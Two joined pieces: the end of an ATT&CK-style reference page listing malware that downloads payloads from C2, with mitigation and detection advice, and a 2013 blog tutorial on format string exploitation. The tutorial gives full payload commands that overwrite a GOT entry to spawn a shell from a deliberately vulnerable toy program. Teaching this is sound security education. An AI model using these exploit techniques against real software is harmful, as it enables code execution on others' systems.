to\/from a victim\nmachine.^[1425][373]\n[1426]S0650 [1427]QakBot\n[1428]QakBot has the ability to download additional components and\nmalware.^[1429][374]^[1430][375]^[1431][376]^[1432][377]^[1433][378]^[1\n434][379]\n[1435]S0262 [1436]QuasarRAT\n[1437]QuasarRAT can download files to the victim\u2019s machine and execute\nthem.^[1438][380]^[1439][381]\n[1440]S0686 [1441]QuietSieve\n[1442]QuietSieve can download and execute payloads on a target\nhost.^[1443][204]\n[1444]S0629 [1445]RainyDay\n[1446]RainyDay can download files to a compromised host.^[1447][323]\n[1448]G0075 [1449]Rancor\n[1450]Rancor has downloaded additional malware, including by using\n[1451]certutil.^[1452][148]\n[1453]S0055 [1454]RARSTONE\n[1455]RARSTONE downloads its backdoor component from a C2 server and\nloads it directly into memory.^[1456][382]\n[1457]S0241 [1458]RATANKBA\n[1459]RATANKBA uploads and downloads\ninformation.^[1460][383]^[1461][384]\n[1462]S0662 [1463]RCSession\n[1464]RCSession has the ability to drop additional files to an infected\nmachine.^[1465][385]\n[1466]S0495 [1467]RDAT\n[1468]RDAT can download files via DNS.^[1469][386]\n[1470]S0153 [1471]RedLeaves\n[1472]RedLeaves is capable of downloading a file from a specified\nURL.^[1473][387]\n[1474]S0511 [1475]RegDuke\n[1476]RegDuke can download files from C2.^[1477][274]\n[1478]S0332 [1479]Remcos\n[1480]Remcos can upload and download files to and from the victim\u2019s\nmachine.^[1481][388]\n[1482]S0166 [1483]RemoteCMD\n[1484]RemoteCMD copies a file over to the remote system before\nexecution.^[1485][389]\n[1486]S0592 [1487]RemoteUtilities\n[1488]RemoteUtilities can upload and download files to and from a\ntarget machine.^[1489][318]\n[1490]S0125 [1491]Remsec\n[1492]Remsec contains a network loader to receive executable modules\nfrom remote attackers and run them on the local victim. It can also\nupload and download files over HTTP and HTTPS.^[1493][390]^[1494][391]\n[1495]S0379 [1496]Revenge RAT\n[1497]Revenge RAT has the ability to upload and download\nfiles.^[1498][392]\n[1499]S0496 [1500]REvil\n[1501]REvil can download a copy of itself from an attacker controlled\nIP address to the victim machine.^[1502][393]^[1503][394]^[1504][395]\n[1505]S0258 [1506]RGDoor\n[1507]RGDoor uploads and downloads files to and from the victim\u2019s\nmachine.^[1508][396]\n[1509]G0106 [1510]Rocke\n[1511]Rocke used malware to download additional malicious files to the\ntarget system.^[1512][397]\n[1513]S0270 [1514]RogueRobin\n[1515]RogueRobin can save a new file to the system from the C2\nserver.^[1516][398]^[1517][399]\n[1518]S0240 [1519]ROKRAT\n[1520]ROKRAT can retrieve additional malicious payloads from its C2\nserver.^[1521][400]^[1522][401]^[1523][34]^[1524][402]\n[1525]S0148 [1526]RTM\n[1527]RTM can download additional files.^[1528][403]^[1529][404]\n[1530]S0085 [1531]S-Type\n[1532]S-Type can download additional files onto a compromised\nhost.^[1533][306]\n[1534]S1018 [1535]Saint Bot\n[1536]Saint Bot can download additional files onto a compromised\nhost.^[1537][172]\n[1538]S0074 [1539]Sakula\n[1540]Sakula has the capability to download files.^[1541][405]\n[1542]G0034 [1543]Sandworm Team\n[1544]Sandworm Team has pushed additional malicious tools onto an\ninfected system to steal user credentials, move laterally, and destroy\ndata.^[1545][406]^[1546][407]\n[1547]S1085 [1548]Sardonic\n[1549]Sardonic has the ability to upload additional malicious files to\na compromised machine.^[1550][408]\n[1551]S0461 [1552]SDBbot\n[1553]SDBbot has the ability to download a DLL from C2 to a compromised\nhost.^[1554][409]\n[1555]S0053 [1556]SeaDuke\n[1557]SeaDuke is capable of uploading and downloading\nfiles.^[1558][410]\n[1559]S0345 [1560]Seasalt\n[1561]Seasalt has a command to download additional\nfiles.^[1562][69]^[1563][69]\n[1564]S0185 [1565]SEASHARPEE\n[1566]SEASHARPEE can download remote files onto victims.^[1567][411]\n[1568]S0382 [1569]ServHelper\n[1570]ServHelper may download additional files to\nexecute.^[1571][412]^[1572][413]\n[1573]S0639 [1574]Seth-Locker\n[1575]Seth-Locker has the ability to download and execute files on a\ncompromised host.^[1576][414]\n[1577]S0596 [1578]ShadowPad\n[1579]ShadowPad has downloaded code from a C2 server.^[1580][415]\n[1581]S0140 [1582]Shamoon\n[1583]Shamoon can download an executable to run on the\nvictim.^[1584][416]\n[1585]S1019 [1586]Shark\n[1587]Shark can download additional files from its C2 via HTTP or\nDNS.^[1588][304]^[1589][417]\n[1590]S1089 [1591]SharpDisco\n[1592]SharpDisco has been used to download a Python interpreter to\nC:\\Users\\Public\\WinTN\\WinTN.exe as well as other plugins from external\nsources.^[1593][153]\n[1594]S0546 [1595]SharpStage\n[1596]SharpStage has the ability to download and execute additional\npayloads via a DropBox API.^[1597][161]^[1598][162]\n[1599]S0450 [1600]SHARPSTATS\n[1601]SHARPSTATS has the ability to upload and download\nfiles.^[1602][418]\n[1603]S0444 [1604]ShimRat\n[1605]ShimRat can download additional files.^[1606][419]\n[1607]S0445 [1608]ShimRatReporter\n[1609]ShimRatReporter had the ability to download additional\npayloads.^[1610][419]\n[1611]S0217 [1612]SHUTTERSPEED\n[1613]SHUTTERSPEED can download and execute an arbitary\nexecutable.^[1614][31]\n[1615]S0589 [1616]Sibot\n[1617]Sibot can download and execute a payload onto a compromised\nsystem.^[1618][211]\n[1619]G1008 [1620]SideCopy\n[1621]SideCopy has delivered trojanized executables via spearphishing\nemails that contacts actor-controlled servers to download malicious\npayloads.^[1622][6]\n[1623]S0610 [1624]SideTwist\n[1625]SideTwist has the ability to download additional\nfiles.^[1626][420]\n[1627]G0121 [1628]Sidewinder\n[1629]Sidewinder has used LNK files to download remote files to the\nvictim's network.^[1630][421]^[1631][422]\n[1632]G0091 [1633]Silence\n[1634]Silence has downloaded additional modules and malware to victim\u2019s\nmachines.^[1635][423]\n[1636]S0692 [1637]SILENTTRINITY\n[1638]SILENTTRINITY can load additional files and tools, including\n[1639]Mimikatz.^[1640][424]\n[1641]S0468 [1642]Skidmap\n[1643]Skidmap has the ability to download files on an infected\nhost.^[1644][425]\n[1645]S0633 [1646]Sliver\n[1647]Sliver can upload files from the C2 server to the victim machine\nusing the upload command.^[1648][426]\n[1649]S0533 [1650]SLOTHFULMEDIA\n[1651]SLOTHFULMEDIA has downloaded files onto a victim\nmachine.^[1652][427]\n[1653]S0218 [1654]SLOWDRIFT\n[1655]SLOWDRIFT downloads additional payloads.^[1656][31]\n[1657]S1035 [1658]Small Sieve\n[1659]Small Sieve has the ability to download files.^[1660][428]\n[1661]S0226 [1662]Smoke Loader\n[1663]Smoke Loader downloads a new version of itself once it has\ninstalled. It also downloads additional plugins.^[1664][429]\n[1665]S0649 [1666]SMOKEDHAM\n[1667]SMOKEDHAM has used Powershell to download UltraVNC and\n[1668]ngrok from third-party file sharing sites.^[1669][430]\n[1670]S1086 [1671]Snip3\n[1672]Snip3 can download additional payloads to compromised\nsystems.^[1673][431]^[1674][432]\n[1675]S0627 [1676]SodaMaster\n[1677]SodaMaster has the ability to download additional payloads from\nC2 to the targeted system.^[1678][167]\n[1679]C0024 [1680]SolarWinds Compromise\nDuring the [1681]SolarWinds Compromise, [1682]APT29 downloaded\nadditional malware, such as [1683]TEARDROP and [1684]Cobalt Strike,\nonto a compromised host following initial access.^[1685][433]\n[1686]S0615 [1687]SombRAT\n[1688]SombRAT has the ability to download and execute additional\npayloads.^[1689][131]^[1690][149]^[1691][434]\n[1692]S0516 [1693]SoreFang\n[1694]SoreFang can download additional payloads from\nC2.^[1695][435]^[1696][436]\n[1697]S0374 [1698]SpeakUp\n[1699]SpeakUp downloads and executes additional files from a remote\nserver. ^[1700][437]\n[1701]S0646 [1702]SpicyOmelette\n[1703]SpicyOmelette can download malicious files from threat actor\ncontrolled AWS URL's.^[1704][438]\n[1705]S0390 [1706]SQLRat\n[1707]SQLRat can make a direct SQL connection to a Microsoft database\ncontrolled by the attackers, retrieve an item from the bindata table,\nthen write and execute the file on disk.^[1708][439]\n[1709]S1030 [1710]Squirrelwaffle\n[1711]Squirrelwaffle has downloaded and executed additional encoded\npayloads.^[1712][440]^[1713][441]\n[1714]S0380 [1715]StoneDrill\n[1716]StoneDrill has downloaded and dropped temporary files containing\nscripts; it additionally has a function to upload files from the\nvictims machine.^[1717][442]\n[1718]S1034 [1719]StrifeWater\n[1720]StrifeWater can download updates and auxiliary\nmodules.^[1721][443]\n[1722]S0491 [1723]StrongPity\n[1724]StrongPity can download files to specified targets.^[1725][444]\n[1726]S0559 [1727]SUNBURST\n[1728]SUNBURST delivered different payloads, including [1729]TEARDROP\nin at least one instance.^[1730][433]\n[1731]S1064 [1732]SVCReady\n[1733]SVCReady has the ability to download additional tools such as the\nRedLine Stealer to an infected host.^[1734][445]\n[1735]S0663 [1736]SysUpdate\n[1737]SysUpdate has the ability to download files to a compromised\nhost.^[1738][350]^[1739][446]\n[1740]G1018 [1741]TA2541\n[1742]TA2541 has used malicious scripts and macros with the ability to\ndownload additional payloads.^[1743][447]\n[1744]G0092 [1745]TA505\n[1746]TA505 has downloaded additional malware to execute on victim\nsystems.^[1747][448]^[1748][413]^[1749][449]\n[1750]G0127 [1751]TA551\n[1752]TA551 has retrieved DLLs and installer binaries for malware\nexecution from C2.^[1753][450]\n[1754]S0011 [1755]Taidoor\n[1756]Taidoor has downloaded additional files onto a compromised\nhost.^[1757][451]\n[1758]S0586 [1759]TAINTEDSCRIBE\n[1760]TAINTEDSCRIBE can download additional modules from its C2\nserver.^[1761][452]\n[1762]S0164 [1763]TDTESS\n[1764]TDTESS has a command to download and execute an additional\nfile.^[1765][453]\n[1766]G0139 [1767]TeamTNT\n[1768]TeamTNT has the curl and wget commands as well as batch scripts\nto download new tools.^[1769][454]^[1770][455]\n[1771]S0595 [1772]ThiefQuest\n[1773]ThiefQuest can download and execute payloads in-memory or from\ndisk.^[1774][456]\n[1775]G0027 [1776]Threat Group-3390\n[1777]Threat Group-3390 has downloaded additional malware and tools,\nincluding through the use of certutil, onto a compromised host\n.^[1778][229]^[1779][457]\n[1780]S0665 [1781]ThreatNeedle\n[1782]ThreatNeedle can download additional tools to enable lateral\nmovement.^[1783][266]\n[1784]S0668 [1785]TinyTurla\n[1786]TinyTurla has the ability to act as a second-stage dropper used\nto infect the system with additional malware.^[1787][458]\n[1788]S0671 [1789]Tomiris\n[1790]Tomiris can download files and execute them on a victim's\nsystem.^[1791][459]\n[1792]G0131 [1793]Tonto Team\n[1794]Tonto Team has downloaded malicious DLLs which served as a\n[1795]ShadowPad loader.^[1796][460]\n[1797]S0266 [1798]TrickBot\n[1799]TrickBot downloads several additional files and saves them to the\nvictim's machine.^[1800][461]^[1801][462]\n[1802]S0094 [1803]Trojan.Karagany\n[1804]Trojan.Karagany can upload, download, and execute files on the\nvictim.^[1805][463]^[1806][464]\n[1807]G0081 [1808]Tropic Trooper\n[1809]Tropic Trooper has used a delivered trojan to download additional\nfiles.^[1810][465]\n[1811]S0436 [1812]TSCookie\n[1813]TSCookie has the ability to upload and download files to and from\nthe infected host.^[1814][466]\n[1815]S0647 [1816]Turian\n[1817]Turian can download additional files and tools from its\nC2.^[1818][55]\n[1819]G0010 [1820]Turla\n[1821]Turla has used shellcode to download Meterpreter after\ncompromising a victim.^[1822][467]\n[1823]S0199 [1824]TURNEDUP\n[1825]TURNEDUP is capable of downloading additional files.^[1826][468]\n[1827]S0263 [1828]TYPEFRAME\n[1829]TYPEFRAME can upload and download files to the victim\u2019s\nmachine.^[1830][469]\n[1831]S0333 [1832]UBoatRAT\n[1833]UBoatRAT can upload and download files to the victim\u2019s\nmachine.^[1834][470]\n[1835]S0130 [1836]Unknown Logger\n[1837]Unknown Logger is capable of downloading remote files.^[1838][58]\n[1839]S0275 [1840]UPPERCUT\n[1841]UPPERCUT can download and upload files to and from the victim\u2019s\nmachine.^[1842][471]\n[1843]S0022 [1844]Uroburos\n[1845]Uroburos can use a Put command to write files to an infected\nmachine.^[1846][472]\n[1847]S0386 [1848]Ursnif\n[1849]Ursnif has dropped payload and configuration files to disk.\n[1850]Ursnif has also been used to download and execute additional\npayloads.^[1851][473]^[1852][474]\n[1853]S0476 [1854]Valak\n[1855]Valak has downloaded a variety of modules and payloads to the\ncompromised host, including [1856]IcedID and NetSupport Manager\nRAT-based malware.^[1857][475]^[1858][476]\n[1859]S0636 [1860]VaporRage\n[1861]VaporRage has the ability to download malicious shellcode to\ncompromised systems.^[1862][80]\n[1863]S0207 [1864]Vasport\n[1865]Vasport can download files.^[1866][477]\n[1867]S0442 [1868]VBShower\n[1869]VBShower has the ability to download VBS files to the target\ncomputer.^[1870][478]\n[1871]S0257 [1872]VERMIN\n[1873]VERMIN can download and upload files to the victim's\nmachine.^[1874][479]\n[1875]G0123 [1876]Volatile Cedar\n[1877]Volatile Cedar can deploy additional tools.^[1878][105]\n[1879]S0180 [1880]Volgmer\n[1881]Volgmer can download remote files and additional payloads to the\nvictim's machine.^[1882][480]^[1883][481]^[1884][482]\n[1885]S0670 [1886]WarzoneRAT\n[1887]WarzoneRAT can download and execute additional files.^[1888][483]\n[1889]S0579 [1890]Waterbear\n[1891]Waterbear can receive and load executables from remote C2\nservers.^[1892][484]\n[1893]S0109 [1894]WEBC2\n[1895]WEBC2 can download and execute a file.^[1896][485]\n[1897]S0515 [1898]WellMail\n[1899]WellMail can receive data and executable scripts from\nC2.^[1900][486]\n[1901]S0514 [1902]WellMess\n[1903]WellMess can write files to a compromised\nhost.^[1904][24]^[1905][487]\n[1906]S0689 [1907]WhisperGate\n[1908]WhisperGate can download additional stages of malware from a\nDiscord CDN channel.^[1909][488]^[1910][489]^[1911][490]^[1912][491]\n[1913]G0107 [1914]Whitefly\n[1915]Whitefly has the ability to download additional tools from the\nC2.^[1916][492]\n[1917]S0206 [1918]Wiarp\n[1919]Wiarp creates a backdoor through which remote attackers can\ndownload files.^[1920][493]\n[1921]G0112 [1922]Windshift\n[1923]Windshift has used tools to deploy additional payloads to\ncompromised hosts.^[1924][494]\n[1925]S0430 [1926]Winnti for Linux\n[1927]Winnti for Linux has the ability to deploy modules directly from\ncommand and control (C2) servers, possibly for remote command\nexecution, file exfiltration, and socks5 proxying on the infected host.\n^[1928][495]\n[1929]S0141 [1930]Winnti for Windows\nThe [1931]Winnti for Windows dropper can place malicious payloads on\ntargeted systems.^[1932][496]\n[1933]G0044 [1934]Winnti Group\n[1935]Winnti Group has downloaded an auxiliary program named ff.exe to\ninfected machines.^[1936][497]\n[1937]G0090 [1938]WIRTE\n[1939]WIRTE has downloaded PowerShell code from the C2 server to be\nexecuted.^[1940][498]\n[1941]G0102 [1942]Wizard Spider\n[1943]Wizard Spider can transfer malicious payloads such as ransomware\nto compromised machines.^[1944][499]\n[1945]S1065 [1946]Woody RAT\n[1947]Woody RAT can download files from its C2 server, including the\n.NET DLLs, WoodySharpExecutor and WoodyPowerSession.^[1948][500]\n[1949]S0341 [1950]Xbash\n[1951]Xbash can download additional malicious files from its C2\nserver.^[1952][501]\n[1953]S0653 [1954]xCaon\n[1955]xCaon has a command to download files to the victim's\nmachine.^[1956][81]\n[1957]S0658 [1958]XCSSET\n[1959]XCSSET downloads browser specific AppleScript modules using a\nconstructed URL with the curl command, https:\/\/\" & domain &\n\"\/agent\/scripts\/\" & moduleName & \".applescript.^[1960][502]\n[1961]S0388 [1962]YAHOYAH\n[1963]YAHOYAH uses HTTP GET requests to download other files that are\nexecuted in memory.^[1964][503]\n[1965]S0251 [1966]Zebrocy\n[1967]Zebrocy obtains additional code to execute on the victim's\nmachine, including the downloading of a secondary\npayload.^[1968][504]^[1969][99]^[1970][505]^[1971][20]\n[1972]S0230 [1973]ZeroT\n[1974]ZeroT can download additional payloads onto the\nvictim.^[1975][506]\n[1976]S0330 [1977]Zeus Panda\n[1978]Zeus Panda can download additional malware plug-in modules and\nexecute them on the victim\u2019s machine.^[1979][507]\n[1980]G0128 [1981]ZIRCONIUM\n[1982]ZIRCONIUM has used tools to download malicious files to\ncompromised hosts.^[1983][508]\n[1984]S0086 [1985]ZLib\n[1986]ZLib has the ability to download files.^[1987][306]\n[1988]S0672 [1989]Zox\n[1990]Zox can download files to a compromised machine.^[1991][225]\n[1992]S0412 [1993]ZxShell\n[1994]ZxShell has a command to transfer files from a remote\nhost.^[1995][509]\n[1996]S1013 [1997]ZxxZ\n[1998]ZxxZ can download and execute additional files.^[1999][74]\nMitigations\nID Mitigation Description\n[2000]M1031 [2001]Network Intrusion Prevention\nNetwork intrusion detection and prevention systems that use network\nsignatures to identify traffic for specific adversary malware or\nunusual data transfer over known protocols like FTP can be used to\nmitigate activity at the network level. Signatures are often for unique\nindicators within protocols and may be based on the specific\nobfuscation technique used by a particular adversary or tool, and will\nlikely be different across various malware families and versions.\nAdversaries will likely change tool C2 signatures over time or\nconstruct protocols in such a way as to avoid detection by common\ndefensive tools.^[2002][510]\nDetection\nID Data Source Data Component Detects\n[2003]DS0017 [2004]Command [2005]Command Execution\nMonitor executed commands and arguments for suspicious activity\nassociated with downloading external content.\n[2006]DS0022 [2007]File [2008]File Creation\nMonitor for file creation and files transferred into the network\n[2009]DS0029 [2010]Network Traffic [2011]Network Connection Creation\nMonitor for newly constructed network connections that are sent or\nreceived by untrusted hosts or creating files on-system may be\nsuspicious. Use of utilities, such as FTP, that does not normally occur\nmay also be suspicious.\n[2012]Network Traffic Content\nMonitor network traffic content for files and other potentially\nmalicious content, especially data coming in from abnormal\/unknown\ndomain and IPs.\n[2013]Network Traffic Flow\nMonitor network data for uncommon data flows (e.g., a client sending\nsignificantly more data than it receives from a server). Processes\nutilizing the network that do not normally have network communication\nor have never been seen before are suspicious."}
{"text":"#[1]Code Arcana ATOM Feed\n[2]Code Arcana\n* [3]About\n* [4]Blog\n* [5]Management\n* [6]Performance engineering\n* [7]Security\n* [8]Software engineering\n[9]Introduction to format string exploits\n[10]Tweet\nThu 02 May 2013\nIn [11]security.\ntags: [12]exploitation[13]tutorial\nIt would be helpful to be familiar with the x86 calling conventions\nbefore reading this tutorial. I prepared a brief primer [14]here and\nyou are encouraged to learn more on your own.\nHow do format strings vulnerabilities work?\nFormat string vulnerabilities are a pretty silly class of bug that take\nadvantage of an easily avoidable programmer error. If the programmer\npasses an attacker-controlled buffer as the argument to a printf (or\nany of the related functions, including sprintf, fprintf, etc), the\nattacker can perform writes to arbitrary memory addresses. The\nfollowing program contains such an error:\n#include<stdio.h>\nint main(int argc, char** argv) {\nchar buffer[100];\nstrncpy(buffer, argv[1], 100);\nprintf(buffer);\nreturn 0;\n}\nSince printf has a variable number of arguments, it must use the format\nstring to determine the number of arguments. In the case above, the\nattacker can pass the string \"%p %p %p %p %p %p %p %p %p %p %p %p %p %p\n%p\" and fool the printf into thinking it has 15 arguments. It will\nnaively print the next 15 addresses on the stack, thinking they are its\narguments:\n$ .\/a.out \"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p\"\n0xffffdddd 0x64 0xf7ec1289 0xffffdbdf 0xffffdbde (nil) 0xffffdcc4 0xffffdc64 (ni\nl) 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520\nAt about 10 arguments up the stack, we can see a repeating pattern of\n0x252070 - those are our %ps on the stack! We start our string with\nAAAA to see this more explicitly:\n$ .\/a.out \"AAAA%p %p %p %p %p %p %p %p %p %p\"\nAAAA0xffffdde8 0x64 0xf7ec1289 0xffffdbef 0xffffdbee (nil) 0xffffdcd4 0xffffdc74\n(nil) 0x41414141\nThe 0x41414141 is the hex representation of AAAA. We now have a way to\npass an arbitrary value (in this case, we're passing 0x41414141) as an\nargument to printf. At this point we will take advantage of another\nformat string feature: in a format specifier, we can also select a\nspecific argument. For example, printf(\"%2$x\", 1, 2, 3) will print 2.\nIn general, we can do printf(\"%<some number>$x\") to select an arbitrary\nargument to printf. In our case, we see that 0x41414141 is the 10th\nargument to printf, so we can simplify our string^[15]1:\n$ .\/a.out 'AAAA%10$p'\nAAAA0x41414141\nSo how do we turn this into an arbitrary write primitive? Well, printf\nhas a really interesting format specifier: %n. From the man page of\nprintf:\nThe number of characters written so far is stored into the integer\nindicated by the int * (or variant) pointer argument. No argument is\nconverted.\nIf we were to pass the string AAAA%10$n, we would write the value 4 to\nthe address 0x41414141! We can use another printf feature to write\nlarger values: if we do printf(\"AAAA%100x\"), 104 characters will be\noutput (because %100x prints the argument padded to at least 100\ncharacters). We can do AAAA%<value-4>x%10$n to write an arbitrary value\nto 0x41414141.\nThe next thing to know is that almost certainly don't want to write all\ncharacters in one go: for example, if we want to write the value\n0x0804a004, we would have to write 134520836 characters to standard\nout! Instead, we break it up into two writes: first we write 0x0804\n(2052) to the higher two bytes of the target address and then we write\n0xa004 (40964) to the lower two bytes of the target address. To do\nthis, we will use %hn to write only 2 bytes at a time. Such a format\nstring might look like this: CAAAAAAA%2044x%10$hn%38912x%11$hn. Lets\nbreak this down so we can understand it.\n* CAAAAAAA - this is the higher two bytes of the target address\n(0x41414143) and the lower two bytes of the target address\n(0x41414141)\n* %2044x%10$hn - since we want to have written a total of 2052 bytes\nwhen we get to the first %hn, and we have already written 8 bytes\nso far, we need to write an addition 2044 bytes.\n* %38912x%11$hn - since we want to have written a total of 40964\nbytes when we get to the second %hn, and we since we have already\nwritten 2052 bytes so far, we need to write an additional 38912\nbytes.\nHere is an example of how this might be used ^[16]2:\n.\/a.out \"$(python -c 'import sys; sys.stdout.write(\"CAAAAAAA%2044x%10$hn%38912x%\n11$hn\")')\"\nWhat can we do with them?\nSince a format string vulnerability gives us the ability to write an\narbitrary value to an arbitrary address, we can do a lot of things with\nit. Usually the easiest thing to do is write to a function pointer\nsomewhere and turn our arbitrary write primitive into arbitrary code\nexecution. In dynamically linked programs, these are easy to find. When\na program attempts to execute a function in a shared library, it does\nnot necessarily know the location of that function at compile time.\nInstead, it jumps to a stub function that has a pointer to the correct\nlocation of the function in the shared library. This pointer (located\nin the global offset table, or GOT) is initialized at runtime when the\nstub function is first called.\nFor example, when strcat is used in a program, the following piece of\nstub code allows the program to find the correct location in the shared\nlibrary libc at run time:\n$ objdump -d a.out\n... <snip> ...\n08048330 <strcat@plt>:\n8048330:       ff 25 04 a0 04 08       jmp    *0x804a004\n8048336:       68 08 00 00 00          push   $0x8\n804833b:       e9 d0 ff ff ff          jmp    8048310 <_init+0x3c>\n... <snip> ...\nHere you can see that the stcat@plt is the stub function that jumps to\nGOT entry for strcat (the address 0x804a004), which is set at runtime\nto the location in libc of the strcat function. We can write any value\nwe want to 0x804a004. When strcat is used later in the program, the\nprogram will instead transfer code execution to the value we specified.\nA common technique is to overwrite the GOT entry with the address of\nthe function system, thereby turning a call of strcat(buffer, \"hello\")\ninto the call system(buffer) (if we can control the contents of buffer,\nwe can get a shell!).\nAn example\nFor an example, we will exploit the following C program:\n#include <stdio.h>\n#include <string.h>\n\/\/ compile with gcc -m32 temp.c\nint main(int argc, char** argv) {\nprintf(argv[1]);\nstrdup(argv[1]);\n}\nOur plan is going to be to overwrite the GOT entry of strdup with the\naddress of system, so the program will printf(argv[1]) then\nsystem(argv[1]). Hence, our payload must be a valid argument to system\n- we will start our payload with sh;# (which will be sh and cause the\nrest of the payload to be a comment. This also has the advantage of\nbeing exactly 4 bytes long, which isn't important for this example but\nis very useful in other cases).\nFor every format string exploit, our payload will eventually look\nsomething like this: <address><address+2>%<number>x%<offset>$hn%<other\nnumber>x%<offset+1>$hn. We prepare a payload that will be the same\nlength as our final payload so we can start computing the correct\noffsets and addresses (note that we use %hp and %00000x so we can just\nmodify the string in the last step without modifying its length):\n$ env -i .\/a.out \"$(python -c 'import sys; sys.stdout.write(\"sh;#AAAABBBB%00000x\n%17$hp%00000x%18$hp\")')\"\nsh;#AAAABBBB00xf7fcbff48048449(nil)\nOur goal is to find the correct offsets (instead of 17 and 18) so that\nthe we output sh;#AAAABBBB<garbabe>0x41414141<garbage>0x42424242. This\ntakes some work, but in our case the correct offsets are 99 and 100:\n$ env -i .\/a.out \"$(python -c 'import sys; sys.stdout.write(\"sh;#AAAABBBB%00000x\n%99$hp%00000x%100$hp\")')\"\nsh;#AAAABBBB00x4141414180484490x42424242\nIt is important to note that our payload is very sensitive to a change\nin length: adding one byte to the end of the string will change the\nrequired offsets and perhaps mess up the alignment.\n$ env -i .\/a.out \"$(python -c 'import sys; sys.stdout.write(\"sh;#AAAABBBB%00000x\n%99$hp%00000x%100$hp\")')A\"\nsh;#AAAABBBB00x2e00000080484490x6f2e612fA\nThis is because the arguments are passed onto the stack before the\nstart of our program, and so changing the length of the arguments will\nchange their alignment and the initial stack location for the program\nitself. In order to have our exploit work consistently, we need to\nensure that the payload is at a consistent alignment (and at a\nconsistent offset above us on the stack) by being careful to control\nthe amount of stuff on the stack. This is also why we are using env -i\nas a wrapper for our program (it clears the environment, which is also\npassed onto the stack before the start of a program).\nAnyways, lets find the strdup GOT entry:\n$ objdump -d a.out\n... <snip> ...\n08048330 <strdup@plt>:\n8048330:       ff 25 04 a0 04 08       jmp    *0x804a004\n8048336:       68 08 00 00 00          push   $0x8\n804833b:       e9 d0 ff ff ff          jmp    8048310 <_init+0x3c>\n... <snip> ...\nNow we know where to write. We want to write the address of system to\nthe strdup got entry, 0x804a004. For now, we plug in our address into\nthe payload and make sure everything still works out:\n$ env -i .\/a.out \"$(python -c 'import sys; sys.stdout.write(\"sh;#\\x04\\xa0\\x04\\x0\n8\\x06\\xa0\\x04\\x08%00000x%99$hp%00000x%100$hp\")')\"\nsh;#00x804a00480484490x804a006\nThe next step is to figure out where to write. First, since it is a 32\nbit binary, we can disable libc randomization. We disable libc\nrandomization via:\n$ ulimit -s unlimited\nNow the address of system is at a deterministic location in memory. We\ncan just open up the program in gdb and print the address of system:\n$ gdb -q a.out\nReading symbols from \/home\/ppp\/a.out...(no debugging symbols found)...done.\n(gdb) b main\nBreakpoint 1 at 0x8048417\n(gdb) r\nStarting program: \/home\/ppp\/a.out\nBreakpoint 1, 0x08048417 in main ()\n(gdb) p system\n$1 = {<text variable, no debug info>} 0x555c2250 <system>\nAll right, now we know that we need to write 0x555c2250 (the address of\nsystem) to the address 0x804a004 (the got entry of strdup). We are\ndoing this in two parts. First, we write 0x2250 to the two bytes at\n0x804a004 then we write 0x555c to the two bytes at 0x804a006. We can\nfigure out how many bytes to write in python:\n$ python\n>>> 0x2250 - 12 # We've already written 12 bytes (\"sh;#AAAABBBB\").\n8772\n>>> 0x555c - 0x2250 # We've already written 0x2250 bytes.\n13068\nNow we plug these values into our payload, change the %hp to %hn. Note\nthat when we change the %00000x to %08772, we leave the leading 0 so\nthat our string stays the same length. Here is the final exploit:\n$ env -i .\/a.out \"$(python -c 'import sys; sys.stdout.write(\"sh;#\\x04\\xa0\\x04\\x0\n8\\x06\\xa0\\x04\\x08%08772x%99$hn%13068x%100$hn\")')\"\nsh;#..<garbage>..sh-4.2$\nWoo hoo, we got our shell!\nDebugging an exploit\nSometimes, things don't go as planned and we don't get a shell. If this\nhappens, gdb is your friend. Unfortunately, gdb isn't a very good\nfriend. It helpfully puts stuff in your environment, so any careful\ncalculations you were doing related to the stack may no longer be\nvalid. In order to resolve this, you need to make sure your environment\nlooks like the environment used by gdb. We first see what the stack\nlooks like under gdb and then always run our exploit with that\nenvironment:\n$ env -i \/usr\/bin\/printenv\n$ gdb -q \/usr\/bin\/printenv\nReading symbols from \/usr\/bin\/printenv...(no debugging symbols found)...done.\n(gdb) unset env\nDelete all environment variables? (y or n) y\n(gdb) r\nStarting program: \/usr\/bin\/printenv\nPWD=\/home\/ppp\nSHLVL=0\nNow that we know the environment used by gdb, we can make sure to\nalways execute our payload with the same environment so we can test our\nexploit in gdb:\n$ env -i PWD=$(pwd) SHLVL=0 .\/a.out \"$(python -c 'print \"my_exploit_string\"')\" #\nOutside gdb.\n$ gdb .\/a.out # Inside gdb.\n(gdb) unset env\nDelete all environment variables? (y or n) y\n(gdb) r \"$(\/usr\/bin\/python -c 'print \"my_exploit_string\"')\"\nThe most helpful thing to do in gdb is to break just before the call to\nprintf and make sure the argument and the stack stack is what you\nexpect (if you expect to use %10$hn, make sure the value you control is\nthe 10th argument after the format string). If that works, then break\nright after the call to printf and make sure the value you expect is at\nthe target address.\nBreakpoint 1, 0x080484ae in main ()\n(gdb) x\/2i $pc\n=> 0x80484ae <main+74>: call   0x8048360 <printf@plt>\n0x80484b3 <main+79>: mov    $0x0,%eax\n(gdb) x\/a $esp\n0xffffdb70: 0xffffdb98\n(gdb) x\/s 0xffffdb98\n0xffffdb98:  \"AAAA%10$p\"\n(gdb) x\/11a $esp\n0xffffdb70: 0xffffdb98  0xffffdddd  0x64    0xf7ec1289\n0xffffdb80: 0xffffdbbf  0xffffdbbe  0x0 0xffffdca4\n0xffffdb90: 0xffffdc44  0x0 0x41414141\n(gdb) x\/a $esp + 40\n0xffffdb98: 0x41414141\n__________________________________________________________________\n1. You'll note the single quotes - $ is a special symbol on the shell\nand would otherwise need to be escaped. [17]\u21a9\n2. You'll note that we use print the exploit string in a python\nsubshell. This isn't strictly necessary in this case, but for more\ninteresting exploits the ability to print escape characters and use\narbitrary bytes in our payload is very useful. We also print via\nsys.stdout.write to prevent the newline at the end we would get if\nwe otherwise used print and surround the subshell in double quotes\nin case the payload had whitespace in it. [18]\u21a9\nComments !"}
